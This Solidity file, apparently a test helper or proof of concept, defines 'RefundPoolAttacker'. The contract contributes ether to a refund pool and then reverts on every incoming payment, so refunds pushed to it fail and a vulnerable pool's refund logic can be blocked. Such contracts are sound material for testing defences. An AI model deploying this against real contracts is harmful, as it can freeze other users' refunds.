// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IRefundPool {
    function contribute() external payable;
    function refund() external;
}

contract RefundPoolAttacker {
    IRefundPool public immutable pool;

    constructor(address poolAddress) {
        require(poolAddress != address(0), "RefundPoolAttacker: zero pool");
        pool = IRefundPool(poolAddress);
    }

    function contribute() external payable {
        require(msg.value > 0, "RefundPoolAttacker: zero amount");
        pool.contribute{ value: msg.value }();
    }

    function refundSelf() external {
        pool.refund();
    }

    receive() external payable {
        revert("RefundPoolAttacker: refund rejected");
    }
}
